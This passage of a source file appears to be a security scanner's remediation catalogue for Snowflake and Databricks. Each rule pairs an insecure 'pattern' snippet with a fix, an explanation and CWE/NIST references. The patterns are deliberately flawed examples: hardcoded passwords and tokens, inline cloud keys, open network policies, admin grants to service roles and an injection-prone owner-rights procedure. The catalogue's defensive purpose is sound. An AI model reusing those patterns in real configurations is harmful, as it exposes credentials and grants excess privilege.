		fix: "conn = snowflake.connector.connect(\n  account=os.environ['SNOWFLAKE_ACCOUNT'], user=os.environ['SNOWFLAKE_USER'],\n  private_key=load_key_from_secret_manager())  # key-pair auth, no password literal",
		explanation: "Hardcoded Snowflake account/password literals in code or Terraform are exposed in source and history. Source credentials from a secret manager at runtime, prefer RSA key-pair or SSO authentication over passwords, and use Terraform sensitive variables with a secrets backend. Rotate any committed credential.",
		references: ["CWE-798", "OWASP A07:2021", "NIST SP 800-53 IA-5", "Snowflake key-pair auth docs"]
	},
	"SNOWFLAKE_HARDCODED_USER_PASSWORD": {
		pattern: "CREATE USER svc PASSWORD='R3alP@ss' MUST_CHANGE_PASSWORD=FALSE;",
		fix: "-- humans: no inline password; force rotation and MFA/SSO\nCREATE USER alice MUST_CHANGE_PASSWORD=TRUE;\n-- service accounts: key-pair auth, no password\nCREATE USER svc RSA_PUBLIC_KEY='MIIBIjANBg...';",
		explanation: "A CREATE USER with a hardcoded password (especially MUST_CHANGE_PASSWORD=FALSE) commits a live credential and leaves it unchangeable at first login. Remove the literal password and rotate it: require password change for humans (with MFA/SSO), and use RSA key-pair authentication for service accounts.",
		references: ["CWE-798", "CWE-521", "NIST SP 800-53 IA-5", "Snowflake User Management docs"]
	},
	"SNOWFLAKE_INTEGRATION_NO_NETWORK_POLICY": {
		pattern: "CREATE SECURITY INTEGRATION scim TYPE=SCIM ... ENABLED=TRUE; -- reachable from any IP",
		fix: "CREATE NETWORK POLICY idp_only ALLOWED_IP_LIST=('203.0.113.0/24');\nALTER SECURITY INTEGRATION scim SET NETWORK_POLICY = idp_only;\n-- rotate the integration token and store it in a secret manager",
		explanation: "A SCIM/API/security integration with no network policy is reachable from any IP, so a leaked bearer token can be used from anywhere. Attach a NETWORK_POLICY restricting the integration to the IdP/provider IP ranges (CWE-284/CWE-306), rotate the token into a secret manager, and scope the owning role to least privilege.",
		references: ["CWE-284", "CWE-306", "NIST SP 800-53 AC-3", "Snowflake Network Policy docs"]
	},
	"SNOWFLAKE_NETWORK_POLICY_OPEN": {
		pattern: "CREATE NETWORK POLICY p ALLOWED_IP_LIST=('0.0.0.0/0'); -- allows all IPs",
		fix: "CREATE NETWORK POLICY corp ALLOWED_IP_LIST=('203.0.113.0/24','198.51.100.0/24');\nALTER ACCOUNT SET NETWORK_POLICY = corp;\n-- prefer Snowflake Private Link over public IP allowlisting",
		explanation: "A network policy allowing 0.0.0.0/0 or '*' provides no network restriction — the account is reachable from anywhere. Restrict ALLOWED_IP_LIST to specific corporate/VPN CIDR ranges, apply the policy at the account level and to privileged users, and prefer Private Link for VPC-internal connectivity.",
		references: ["CWE-284", "NIST SP 800-53 AC-3", "PCI DSS 4.0 Req 1.4", "Snowflake Network Policy docs"]
	},
	"SNOWFLAKE_NO_ACCESS_HISTORY_MONITORING": {
		pattern: "-- no use of ACCESS_HISTORY / LOGIN_HISTORY — privileged access unmonitored",
		fix: "-- track column-level access on sensitive tables:\nSELECT * FROM SNOWFLAKE.ACCOUNT_USAGE.ACCESS_HISTORY WHERE query_start_time > DATEADD(day,-1,CURRENT_TIMESTAMP());\n-- alert on failed logins / new IPs via LOGIN_HISTORY and export to a SIEM",
		explanation: "Without querying ACCESS_HISTORY and LOGIN_HISTORY, privileged data access and suspicious logins go undetected. Monitor ACCESS_HISTORY for column-level access to sensitive tables, alert on LOGIN_HISTORY anomalies (failed logins, new IPs/clients) via a SIEM, and retain these views beyond the default 365-day window.",
		references: ["CWE-778", "NIST SP 800-53 AU-6", "PCI DSS 4.0 Req 10", "Snowflake Account Usage docs"]
	},
	"SNOWFLAKE_NO_NETWORK_POLICY": {
		pattern: "-- Snowflake account in use with no network policy defined — reachable from any IP",
		fix: "CREATE NETWORK POLICY corp ALLOWED_IP_LIST=('203.0.113.0/24');\nALTER ACCOUNT SET NETWORK_POLICY = corp;\n-- use Private Link for VPC-internal connectivity",
		explanation: "With no network policy, the Snowflake account accepts connections from any IP address, widening the attack surface for stolen credentials. Create a network policy with an explicit ALLOWED_IP_LIST, attach it at the account level, and prefer Private Link for private connectivity.",
		references: ["CWE-284", "NIST SP 800-53 AC-3", "PCI DSS 4.0 Req 1.4", "Snowflake Network Policy docs"]
	},
	"SNOWFLAKE_NO_PASSWORD_POLICY": {
		pattern: "-- Snowflake in use but no PASSWORD POLICY (min length / lockout) defined",
		fix: "CREATE PASSWORD POLICY strong PASSWORD_MIN_LENGTH=14 PASSWORD_MIN_UPPER_CASE_CHARS=1\n  PASSWORD_MIN_NUMERIC_CHARS=1 PASSWORD_MAX_RETRIES=5 PASSWORD_LOCKOUT_TIME_MINS=15 PASSWORD_MAX_AGE_DAYS=90;\nALTER ACCOUNT SET PASSWORD POLICY strong;\n-- prefer SSO/key-pair; reserve passwords for break-glass accounts",
		explanation: "Without a password policy, Snowflake users can set weak passwords with no lockout, enabling brute force and credential stuffing. Define a PASSWORD POLICY with a minimum length of 14+, complexity, retry lockout, and rotation, apply it at the account level, and prefer SSO/key-pair auth for most users.",
		references: ["CWE-521", "NIST SP 800-63B", "PCI DSS 4.0 Req 8.3", "Snowflake Password Policy docs"]
	},
	"SNOWFLAKE_OAUTH_INTEGRATION_WEAK": {
		pattern: "CREATE SECURITY INTEGRATION oauth ... OAUTH_REDIRECT_URI='http://app/cb' BLOCKED_ROLES_LIST=();",
		fix: "CREATE SECURITY INTEGRATION oauth TYPE=OAUTH\n  OAUTH_REDIRECT_URI='https://app.example.com/callback'  -- exact https, no wildcard\n  BLOCKED_ROLES_LIST=('ACCOUNTADMIN','SECURITYADMIN')\n  OAUTH_REFRESH_TOKEN_VALIDITY=86400 ENABLED=TRUE;",
		explanation: "An OAuth integration with an http/wildcard redirect URI enables token interception, and an empty BLOCKED_ROLES_LIST lets OAuth tokens assume ACCOUNTADMIN/SECURITYADMIN. Use exact https redirect URIs, keep the admin roles in BLOCKED_ROLES_LIST, set a short refresh-token validity, and scope the integration to specific clients.",
		references: ["CWE-601", "CWE-269", "RFC 6749", "Snowflake OAuth docs"]
	},
	"SNOWFLAKE_OVERPRIVILEGED_GRANT": {
		pattern: "GRANT ROLE ACCOUNTADMIN TO ROLE etl_service; -- or GRANT ALL PRIVILEGES / GRANT ... TO PUBLIC",
		fix: "-- least-privilege functional role owned by SYSADMIN:\nCREATE ROLE etl_service;\nGRANT USAGE ON WAREHOUSE etl_wh TO ROLE etl_service;\nGRANT SELECT, INSERT ON SCHEMA raw.events TO ROLE etl_service;\n-- reserve ACCOUNTADMIN/SECURITYADMIN for a few named humans with MFA",
		explanation: "Granting ACCOUNTADMIN/SECURITYADMIN or ALL PRIVILEGES to functional/service roles, or granting to PUBLIC (inherited by every user), massively over-provisions access and enables privilege escalation. Build a least-privilege role hierarchy of custom functional roles owned by SYSADMIN, and restrict admin roles to a small set of named humans with MFA.",
		references: ["CWE-269", "NIST SP 800-53 AC-6", "PCI DSS 4.0 Req 7.2", "Snowflake Access Control docs"]
	},
	"SNOWFLAKE_PERIODIC_REKEYING_OFF": {
		pattern: "ALTER ACCOUNT SET PERIODIC_DATA_REKEYING = FALSE; -- encryption keys not rotated",
		fix: "ALTER ACCOUNT SET PERIODIC_DATA_REKEYING = TRUE; -- annual re-encryption with fresh keys\n-- use Tri-Secret Secure with a customer-managed key (CMK) for regulated workloads",
		explanation: "With PERIODIC_DATA_REKEYING = FALSE, Snowflake does not rotate the keys protecting data at rest, weakening long-term key hygiene and complicating compliance evidence. Set it to TRUE so data is re-encrypted with new keys yearly, and use Tri-Secret Secure with a customer-managed key for regulated data.",
		references: ["CWE-320", "NIST SP 800-57 Part 1", "PCI DSS 4.0 Req 3.6", "Snowflake Encryption docs"]
	},
	"SNOWFLAKE_PII_NO_MASKING_POLICY": {
		pattern: "CREATE TABLE customers (ssn STRING, email STRING); -- PII columns with no masking",
		fix: "CREATE MASKING POLICY ssn_mask AS (val STRING) RETURNS STRING ->\n  CASE WHEN CURRENT_ROLE() IN ('PII_READER') THEN val ELSE '***-**-****' END;\nALTER TABLE customers MODIFY COLUMN ssn SET MASKING POLICY ssn_mask;\n-- add ROW ACCESS POLICY where row-level restriction is needed",
		explanation: "PII columns (SSN, card number, email, DOB) with no masking are readable in full by anyone with SELECT, breaching least-privilege and privacy requirements. Apply a MASKING POLICY that reveals values only to authorized roles, use ROW ACCESS POLICY where appropriate, and drive masking centrally via object tags.",
		references: ["CWE-359", "NIST SP 800-53 AC-4", "PCI DSS 4.0 Req 3.4", "Snowflake Masking Policy docs"]
	},
	"SNOWFLAKE_PIPE_STAGE_INLINE_CRED": {
		pattern: "CREATE PIPE p AS COPY INTO t FROM @stage CREDENTIALS=(AWS_KEY_ID='AKIA...' AWS_SECRET_KEY='...');",
		fix: "CREATE STORAGE INTEGRATION s3_int TYPE=EXTERNAL_STAGE STORAGE_PROVIDER='S3'\n  STORAGE_AWS_ROLE_ARN='arn:aws:iam::123:role/snowflake' STORAGE_ALLOWED_LOCATIONS=('s3://bucket/prefix/');\nCREATE STAGE stage URL='s3://bucket/prefix/' STORAGE_INTEGRATION=s3_int;\n-- and a NOTIFICATION INTEGRATION for the pipe; rotate the leaked keys",
		explanation: "Inline cloud credentials (AWS_KEY_ID/AWS_SECRET_KEY/AZURE_SAS_TOKEN) in a CREATE PIPE/STAGE expose long-lived keys in SQL and history. Use a STORAGE INTEGRATION (and NOTIFICATION INTEGRATION for pipes) bound to a cloud role instead, rotate any committed keys, and enforce REQUIRE_STORAGE_INTEGRATION_FOR_STAGE_CREATION = TRUE.",
		references: ["CWE-798", "NIST SP 800-53 IA-5", "Snowflake Storage Integration docs"]
	},
	"SNOWFLAKE_PROCEDURE_EXECUTE_AS_OWNER": {
		pattern: "CREATE PROCEDURE p() ... EXECUTE AS OWNER AS $$ ... 'SELECT ...'||INPUT ... $$; -- injection escalates",
		fix: "CREATE PROCEDURE p() ... EXECUTE AS CALLER AS $$ ... $$; -- runs with caller's privileges\n-- if OWNER's rights are required, bind all SQL and never concatenate caller input\nlet stmt = snowflake.createStatement({ sqlText:'SELECT ... WHERE id = ?', binds:[INPUT] });",
		explanation: "An EXECUTE AS OWNER procedure runs with the owner's privileges, so any SQL injection inside it escalates to those privileges. Prefer EXECUTE AS CALLER unless owner's rights are strictly required; when they are, parameterize every statement, own the procedure with a least-privilege role, and restrict who can CALL it.",
		references: ["CWE-89", "CWE-269", "NIST SP 800-53 SI-10", "Snowflake Stored Procedure docs"]
	},
	"SNOWFLAKE_SCIM_NO_NETWORK_POLICY": {
		pattern: "CREATE SECURITY INTEGRATION scim TYPE=SCIM ...; -- no network policy on the SCIM token",
		fix: "CREATE NETWORK POLICY idp_scim ALLOWED_IP_LIST=('203.0.113.0/24');\nALTER SECURITY INTEGRATION scim SET NETWORK_POLICY = idp_scim;\n-- rotate the SCIM token into a secret manager; scope the run_as role least-privilege",
		explanation: "A SCIM integration with no network policy means its bearer token can be used from any IP, so a leak grants directory-wide user provisioning from anywhere. Attach a NETWORK_POLICY restricting the SCIM token to the IdP IP ranges, rotate the token regularly into a secret manager, and keep the integration's owning role least-privilege.",
		references: ["CWE-284", "CWE-306", "NIST SP 800-53 AC-3", "Snowflake SCIM docs"]
	},
	"SNOWFLAKE_SHARE_PARAMETERIZED_ACCOUNT": {
		pattern: "ALTER SHARE s ADD ACCOUNTS = ${var.recipient}; -- non-pinned, template-driven recipient",
		fix: "-- pin explicit, approved account locators, reviewed in code review:\nALTER SHARE s ADD ACCOUNTS = ORG_ACCOUNT_ABC123;\n-- apply secure views / row-access policies to shared objects and audit share membership",
		explanation: "Adding a share to a variable/template-driven account (${var}, var.*, :bind) means the recipient is not statically reviewable and could be redirected to an attacker-controlled org. Pin ADD ACCOUNTS to explicitly named, approved account locators, review each addition, and protect shared objects with secure views/row-access policies.",
		references: ["CWE-668", "NIST SP 800-53 AC-4", "Snowflake Secure Data Sharing docs"]
	},
	"SNOWFLAKE_SHARE_WILDCARD_PUBLIC": {
		pattern: "ALTER SHARE s ADD ACCOUNTS = '*'; -- or a public Marketplace listing of sensitive data",
		fix: "ALTER SHARE s ADD ACCOUNTS = ORG_ACCOUNT_ABC123; -- named, expected accounts only\n-- apply secure views / row-access policies before sharing; review public listings",
		explanation: "Sharing to wildcard accounts or publishing sensitive data as a public Marketplace listing exposes it far beyond the intended audience. Share only with explicitly named accounts, review any public listing for unintended exposure, and apply secure views/row-access policies to shared objects.",
		references: ["CWE-668", "CWE-200", "NIST SP 800-53 AC-4", "Snowflake Secure Data Sharing docs"]
	},
	"SNOWFLAKE_STORAGE_INTEGRATION_WILDCARD": {
		pattern: "CREATE STORAGE INTEGRATION i ... STORAGE_ALLOWED_LOCATIONS=('*'); -- all / root locations",
		fix: "CREATE STORAGE INTEGRATION i TYPE=EXTERNAL_STAGE STORAGE_PROVIDER='S3'\n  STORAGE_AWS_ROLE_ARN='arn:aws:iam::123:role/snowflake'\n  STORAGE_ALLOWED_LOCATIONS=('s3://bucket/prefix/')\n  STORAGE_BLOCKED_LOCATIONS=('s3://bucket/secrets/');",
		explanation: "A storage integration allowing '*' or a bare bucket root lets stages read/write far beyond intended paths, an exfiltration and tampering risk. Set STORAGE_ALLOWED_LOCATIONS to exact bucket/prefix paths, populate STORAGE_BLOCKED_LOCATIONS for sensitive prefixes, and bind the integration to a least-privilege cloud role scoped to those exact locations.",
		references: ["CWE-668", "NIST SP 800-53 AC-6", "Snowflake Storage Integration docs"]
	},
	"SNOWFLAKE_TASK_STREAM_ADMIN_OWNED": {
		pattern: "CREATE TASK t ...; -- owned by ACCOUNTADMIN; runs with elevated privilege",
		fix: "CREATE ROLE task_runner;\nGRANT EXECUTE TASK ON ACCOUNT TO ROLE task_runner;\n-- create/own the task with task_runner (least privilege), not ACCOUNTADMIN",
		explanation: "Tasks and streams run with the privileges of their owning role, so owning them with ACCOUNTADMIN means every scheduled run executes with full account power. Own tasks/streams with a least-privilege custom role, grant EXECUTE TASK to the functional role rather than escalating ownership, and keep the owning role minimal.",
		references: ["CWE-269", "NIST SP 800-53 AC-6", "Snowflake Tasks docs"]
	},
	"SNOWFLAKE_WAREHOUSE_NO_AUTO_SUSPEND": {
		pattern: "ALTER WAREHOUSE wh SET AUTO_SUSPEND = 0; -- never suspends, runaway compute",
		fix: "ALTER WAREHOUSE wh SET AUTO_SUSPEND = 60 AUTO_RESUME = TRUE;\nCREATE RESOURCE MONITOR rm WITH CREDIT_QUOTA=100 TRIGGERS ON 90 PERCENT DO SUSPEND;\nALTER WAREHOUSE wh SET RESOURCE_MONITOR = rm;",
		explanation: "AUTO_SUSPEND = 0 keeps a warehouse running indefinitely, amplifying cost and masking abusive query activity (a financial DoS vector). Set a short idle AUTO_SUSPEND (e.g. 60 seconds) with AUTO_RESUME, and attach a resource monitor with a credit quota to cap spend and alert on anomalies.",
		references: ["CWE-400", "NIST SP 800-53 SC-6", "Snowflake Warehouse docs"]
	},
	"SNOWFLAKE_WEAKENED_ACCOUNT_PARAM": {
		pattern: "ALTER ACCOUNT SET REQUIRE_STORAGE_INTEGRATION_FOR_STAGE_CREATION = FALSE; -- security downgrade",
		fix: "ALTER ACCOUNT SET REQUIRE_STORAGE_INTEGRATION_FOR_STAGE_CREATION = TRUE;\nALTER ACCOUNT SET PREVENT_UNLOAD_TO_INLINE_URL = TRUE;\n-- review and justify or revert any ALTER ACCOUNT SET ... = FALSE",
		explanation: "Setting account security parameters to FALSE downgrades protections — e.g. allowing stages to embed raw cloud keys, or enabling data unload to ad-hoc URLs (an exfiltration path). Keep REQUIRE_STORAGE_INTEGRATION_FOR_STAGE_CREATION and PREVENT_UNLOAD_TO_INLINE_URL set to TRUE, and review/justify any security parameter downgrade.",
		references: ["CWE-16", "NIST SP 800-53 CM-6", "Snowflake Account Parameters docs"]
	},
	"SNOWFLAKE_WEAK_AUTH": {
		pattern: "ALTER USER svc SET MINS_TO_BYPASS_MFA=1440; -- or CLIENT_SESSION_KEEP_ALIVE=TRUE",
		fix: "-- enforce MFA; do not configure MINS_TO_BYPASS_MFA\nALTER ACCOUNT SET ALLOW_CLIENT_MFA_CACHING=FALSE;\n-- do not enable session keepalive; use key-pair auth for service accounts\nALTER USER svc SET RSA_PUBLIC_KEY='MIIBIjANBg...';",
		explanation: "Session keepalive extends sessions past idle timeout, and MFA-bypass windows disable a core protection against credential theft. Do not set CLIENT_SESSION_KEEP_ALIVE=TRUE or MINS_TO_BYPASS_MFA, enforce MFA for all human users, and use RSA key-pair authentication for service accounts instead of passwords.",
		references: ["CWE-287", "CWE-613", "NIST SP 800-63B", "Snowflake MFA docs"]
	},

	// -------------------------------------------------------------------------
	// Databricks
	// -------------------------------------------------------------------------
	"DATABRICKS_AUDIT_LOGGING_DISABLED": {
		pattern: "// no databricks_mws_log_delivery; enableVerboseAuditLogs not set — actions unlogged",
		fix: "resource \"databricks_mws_log_delivery\" \"audit\" {\n  config_name = \"audit\"\n  log_type = \"AUDIT_LOGS\"\n  status = \"ENABLED\"\n  output_format = \"JSON\"\n}\n// also set enableVerboseAuditLogs = true so notebook/command actions are captured",
		explanation: "With audit/verbose logging disabled, notebook, command, and privileged workspace actions are not recorded, so misuse and breaches go undetected and there is no audit evidence. Enable databricks_mws_log_delivery (status ENABLED), set enableVerboseAuditLogs = true, ship logs to a tamper-evident store, and alert on privileged actions.",
		references: ["CWE-778", "NIST SP 800-53 AU-6", "PCI DSS 4.0 Req 10", "Databricks Audit Logs docs"]
	},
	"DATABRICKS_DBFS_MOUNT_INLINE_KEY": {
		pattern: "dbutils.fs.mount(source='wasbs://c@a.blob.core.windows.net', extra_configs={'fs.azure.account.key.a.blob.core.windows.net':'REALKEY=='})",
		fix: "key = dbutils.secrets.get(scope='storage', key='blob_account_key')  # from a secret scope\ndbutils.fs.mount(source=..., mount_point='/mnt/data', extra_configs={'fs.azure.account.key.a.blob.core.windows.net': key})\n# better: migrate to a Unity Catalog external location with a managed storage credential",
		explanation: "A DBFS mount configured with an inline storage account/access key exposes long-lived cloud credentials in the notebook and its revision history. Reference the key via dbutils.secrets.get from a backed secret scope, rotate the exposed key, and migrate legacy mounts to Unity Catalog volumes with managed storage credentials.",
		references: ["CWE-798", "NIST SP 800-53 IA-5", "Databricks Secret Scope docs"]
	},
	"DATABRICKS_EXTERNAL_LOCATION_BROAD": {
		pattern: "resource \"databricks_external_location\" \"e\" { url='s3://bucket/*'  skip_validation=true }",
		fix: "resource \"databricks_external_location\" \"e\" {\n  url = \"s3://bucket/team/prefix/\"   # exact prefix, no wildcard\n  credential_name = databricks_storage_credential.sc.name\n  skip_validation = false\n}\n// GRANT READ FILES/WRITE FILES to specific groups, not `account users`",
		explanation: "A Unity Catalog external location with a wildcard URL or skip_validation=true grants over-broad storage access and skips credential verification. Scope external location URLs to exact prefixes, keep skip_validation=false so the credential is validated against the bucket, and grant READ/WRITE FILES only to specific functional groups.",
		references: ["CWE-668", "NIST SP 800-53 AC-6", "Databricks Unity Catalog docs"]
	},
	"DATABRICKS_GIT_CREDENTIAL_INLINE_PAT": {
		pattern: "resource \"databricks_git_credential\" \"g\" { personal_access_token = \"YOUR_GIT_TOKEN\" }",
		fix: "variable \"git_pat\" { type = string, sensitive = true }  # sourced from a secret manager\nresource \"databricks_git_credential\" \"g\" {\n  git_provider = \"gitHub\"\n  personal_access_token = var.git_pat\n}\n// revoke the leaked PAT; prefer fine-grained expiring tokens",
		explanation: "An inline git PAT (ghp_/glpat-/dapi) in databricks_git_credential commits a live token that grants repo access. Provide the PAT via a Terraform sensitive variable sourced from a secret manager, revoke the leaked token, and prefer fine-grained, expiring git tokens or app-based integration over long-lived PATs.",
		references: ["CWE-798", "NIST SP 800-53 IA-5", "Databricks Repos docs"]
	},
	"DATABRICKS_HARDCODED_TOKEN": {
		pattern: "w = WorkspaceClient(host='https://xxx.databricks.com', token='dapiabc123...') # PAT in source",
		fix: "w = WorkspaceClient()  # reads DATABRICKS_HOST / DATABRICKS_TOKEN injected from a secret manager\n# or use OAuth (U2M/M2M) / service-principal credentials; revoke the leaked dapi token",
		explanation: "A hardcoded Databricks PAT (dapi...) or a host URL with embedded credentials exposes workspace access in source and history. Remove and revoke the token, inject it at runtime from a Databricks secret scope or the DATABRICKS_TOKEN env supplied by a secret manager, and prefer OAuth (U2M/M2M) or service-principal auth over long-lived PATs.",
		references: ["CWE-798", "NIST SP 800-53 IA-5", "Databricks Authentication docs"]
	},
	"DATABRICKS_INIT_SCRIPT_UNTRUSTED": {
		pattern: "init_scripts { dbfs { destination = \"dbfs:/scripts/init.sh\" } } // world-writable / external",
		fix: "init_scripts { volumes { destination = \"/Volumes/catalog/schema/init-vol/init.sh\" } }\n// store init scripts in a Unity Catalog volume or workspace files; checksum externally sourced scripts",
		explanation: "A cluster init script sourced from world-writable dbfs:/ paths or external URLs can be tampered with and runs as root on every cluster (supply-chain risk), and global init scripts amplify the blast radius. Store init scripts in a Unity Catalog volume or workspace files, avoid external http(s) fetches, and pin/checksum any externally sourced script.",
		references: ["CWE-494", "CWE-829", "NIST SP 800-53 CM-7", "Databricks Init Scripts docs"]
	},
	"DATABRICKS_INLINE_CREDENTIALS": {
		pattern: "spark.conf.set('fs.s3a.access.key','AKIA...'); df.read.option('password','R3alP@ss')",
		fix: "key = dbutils.secrets.get(scope='aws', key='s3_access_key')\nspark.conf.set('fs.s3a.access.key', key)\n// better: Unity Catalog external locations + storage credentials, or instance profiles / managed identities",
		explanation: "Inline storage keys or JDBC user+password literals in spark.conf.set or DataFrame .option() expose credentials in code and logs. Remove and rotate them, reference secrets via dbutils.secrets.get from a backed scope, and prefer Unity Catalog external locations/storage credentials or instance profiles/managed identities.",
		references: ["CWE-798", "NIST SP 800-53 IA-5", "Databricks Secret Scope docs"]
	},
	"DATABRICKS_INSTANCE_PROFILE_OVERPRIVILEGED": {
		pattern: "aws_attributes { instance_profile_arn = \"arn:aws:iam::123:instance-profile/AdminAccess\" }",
		fix: "aws_attributes { instance_profile_arn = \"arn:aws:iam::123:instance-profile/databricks-data-ro\" }\n// scope the underlying IAM role to the specific S3 buckets/KMS keys the cluster needs; never wildcard ARNs",
		explanation: "Attaching a cluster to an overprivileged instance profile (roles named *Admin/PowerUser/*FullAccess) means any code on the cluster inherits broad cloud access. Attach least-privilege instance profiles, scope the underlying IAM role to the exact S3 buckets/KMS keys required, and never use wildcard instance-profile ARNs.",
		references: ["CWE-269", "NIST SP 800-53 AC-6", "Databricks IAM docs"]
	},
	"DATABRICKS_JOB_RUN_AS_ELEVATED": {
		pattern: "job { run_as { user_name = \"workspace-admin@corp.com\" } } // or run_as_owner = true",
		fix: "job { run_as { service_principal_name = databricks_service_principal.etl.application_id } }\n// scope the service principal to only the catalogs/schemas the job needs",
		explanation: "A job whose run_as identity is an admin/elevated service principal (or run_as_owner=true) executes with that identity's full privileges, so a compromised job escalates broadly. Run jobs as a least-privilege service principal scoped only to the catalogs/schemas they touch, and avoid admin-entitled run_as identities.",
		references: ["CWE-269", "NIST SP 800-53 AC-6", "Databricks Jobs docs"]
	},
	"DATABRICKS_LEGACY_HIVE_METASTORE": {
		pattern: "spark.sql('USE hive_metastore.default') // legacy metastore, no central governance",
		fix: "// assign a Unity Catalog metastore to the workspace and migrate tables:\nspark.sql('CREATE CATALOG IF NOT EXISTS main')\nspark.sql('USE CATALOG main')\n// do not disable spark.databricks.unityCatalog.enabled",
		explanation: "The legacy hive_metastore provides no central governance, lineage, or fine-grained access control, so table/column access is ungoverned. Assign a Unity Catalog metastore to the workspace, migrate tables off hive_metastore, and govern access and lineage through Unity Catalog.",
		references: ["CWE-284", "NIST SP 800-53 AC-3", "Databricks Unity Catalog docs"]
	},
	"DATABRICKS_MODEL_SERVING_PUBLIC": {
		pattern: "resource \"databricks_model_serving\" \"m\" { /* no auth; queryable by all users */ }",
		fix: "// require auth and grant CAN_QUERY to specific principals only:\nresource \"databricks_permissions\" \"m\" {\n  serving_endpoint_id = databricks_model_serving.m.serving_endpoint_id\n  access_control { service_principal_name = databricks_service_principal.infer.application_id\n                   permission_level = \"CAN_QUERY\" }\n}\n// front public inference with an authenticated API gateway + rate limiting",
		explanation: "A model serving endpoint with no auth (or CAN_QUERY granted to the users group) is queryable by anyone, exposing the model to abuse, extraction, and cost amplification. Require PAT/OAuth authentication, grant CAN_QUERY to specific service principals/groups, and front any public inference with an authenticated, rate-limited gateway.",
		references: ["CWE-306", "NIST SP 800-53 AC-3", "OWASP LLM10:2025", "Databricks Model Serving docs"]
	},
	"DATABRICKS_NO_CLUSTER_POLICY": {
		pattern: "resource \"databricks_cluster\" \"c\" { /* no policy_id — unrestricted cluster creation */ }",
		fix: "resource \"databricks_cluster_policy\" \"p\" {\n  definition = jsonencode({ \"data_security_mode\": { \"type\": \"fixed\", \"value\": \"USER_ISOLATION\" }, \"autotermination_minutes\": { \"type\": \"range\", \"maxValue\": 60 } })\n}\nresource \"databricks_cluster\" \"c\" { policy_id = databricks_cluster_policy.p.id }",
		explanation: "Clusters/jobs defined with no cluster policy allow unrestricted compute creation — users can pick insecure security modes, oversized instances, or embed secrets in spark_conf. Create a cluster policy that pins data_security_mode, instance types, autotermination, and forbids inline secrets, reference it via policy_id, and restrict CAN_USE on the policy.",
		references: ["CWE-284", "NIST SP 800-53 CM-6", "Databricks Cluster Policies docs"]
	},
	"DATABRICKS_PERMISSIONS_CAN_MANAGE_USERS": {
		pattern: "access_control { group_name = \"users\"  permission_level = \"CAN_MANAGE\" }",
		fix: "access_control { group_name = \"users\"  permission_level = \"CAN_VIEW\" }\n// reserve CAN_MANAGE for named owners/admins only",
		explanation: "Granting CAN_MANAGE on jobs/clusters/pipelines to the all-users group lets every workspace user modify or take over those objects. Grant broad groups only CAN_VIEW or CAN_RUN, reserve CAN_MANAGE for named owners/admins, and audit object ACLs to remove broad management grants.",
		references: ["CWE-269", "NIST SP 800-53 AC-6", "Databricks Access Control docs"]
	},
	"DATABRICKS_PUBLIC_NETWORK": {
		pattern: "// workspace with public IPs and no IP access list — reachable from the public internet",
		fix: "resource \"databricks_mws_workspaces\" \"w\" { /* ... */ private_access_settings_id = ... }\n// enable no-public-IP (Secure Cluster Connectivity):\n// enable_no_public_ip = true\nresource \"databricks_ip_access_list\" \"allow\" { label=\"corp\" list_type=\"ALLOW\" ip_addresses=[\"203.0.113.0/24\"] enabled=true }",
		explanation: "A Databricks cluster/workspace exposed to the public internet widens the attack surface for stolen credentials and cluster access. Enable no-public-IP (Secure Cluster Connectivity), attach an enabled IP access list restricting access to corporate CIDRs, and deploy into a customer-managed VPC/VNet with Private Link.",
		references: ["CWE-284", "NIST SP 800-53 SC-7", "Databricks Network Security docs"]
	},
	"DATABRICKS_SECRET_LEAK": {
		pattern: "token = dbutils.secrets.get(scope='s', key='api'); print(token) # or displayHTML(token)",
		fix: "token = dbutils.secrets.get(scope='s', key='api')\nresponse = requests.get(url, headers={'Authorization': f'Bearer {token}'})  # use directly, never print\n# audit cluster logs / notebook revisions for any leaked value and rotate it",
		explanation: "Databricks redacts secret values only in interactive notebook cell output, not in logs, displayHTML, or downstream sinks — printing or logging dbutils.secrets.get leaks the secret. Never print/log/echo a retrieved secret; pass it directly into the consuming call, and rotate any secret found in logs or revision history.",
		references: ["CWE-532", "CWE-798", "NIST SP 800-53 IA-5", "Databricks Secrets docs"]
	},
	"DATABRICKS_SERVERLESS_NO_IP_ACL": {
		pattern: "// serverless SQL warehouse enabled with no IP access list restriction",
		fix: "resource \"databricks_ip_access_list\" \"serverless\" { label=\"corp\" list_type=\"ALLOW\" ip_addresses=[\"203.0.113.0/24\"] enabled=true }\n// enable serverless egress controls / network connectivity config (NCC) for the workspace",
		explanation: "A serverless SQL warehouse with no IP access list is reachable from any network, so stolen credentials can be used from anywhere. Attach an enabled IP access list restricting serverless SQL to corporate CIDRs, enable serverless egress controls/NCC, or require Private Link-only connectivity.",
		references: ["CWE-284", "NIST SP 800-53 SC-7", "Databricks Serverless docs"]
	},
	"DATABRICKS_SINGLE_USER_ISOLATION_MISMATCH": {
		pattern: "cluster { data_security_mode = \"NONE\"  single_user_name = \"svc@corp.com\" } // mismatch",
		fix: "cluster { data_security_mode = \"SINGLE_USER\"  single_user_name = \"svc@corp.com\" }\n// or USER_ISOLATION (shared) for multi-user workloads",
		explanation: "Pairing single_user_name with NONE security mode (or leaving single_user_name empty in SINGLE_USER mode) provides no Unity Catalog isolation, so the cluster does not enforce the intended per-user boundary. For SINGLE_USER mode set a real single_user_name, and use USER_ISOLATION for multi-user workloads.",
		references: ["CWE-284", "NIST SP 800-53 AC-4", "Databricks Cluster Access Mode docs"]
	},
	"DATABRICKS_SPARK_CONF_KEY_INLINE": {
		pattern: "spark_conf = { \"fs.azure.account.key.a.blob.core.windows.net\" = \"REALKEY==\" }",
		fix: "spark_conf = { \"fs.azure.account.key.a.blob.core.windows.net\" = \"{{secrets/storage/blob_key}}\" }\n// backed by a Databricks secret scope; prefer Unity Catalog storage credentials / managed identities",
		explanation: "A cluster spark_conf that exposes a storage account/access key inline leaks long-lived cloud credentials to anyone who can read the cluster config. Reference secrets via the {{secrets/scope/key}} spark_conf syntax backed by a secret scope, rotate the exposed key, and prefer Unity Catalog storage credentials or managed identities.",
		references: ["CWE-798", "NIST SP 800-53 IA-5", "Databricks Secret Scope docs"]
	},
	"DATABRICKS_TOKEN_NO_EXPIRY": {
		pattern: "resource \"databricks_token\" \"t\" { lifetime_seconds = -1 } // never expires",
		fix: "resource \"databricks_token\" \"t\" { lifetime_seconds = 3600 } // short-lived, auto-rotated\n// prefer OAuth M2M (service principal) tokens; inventory and revoke non-expiring PATs",
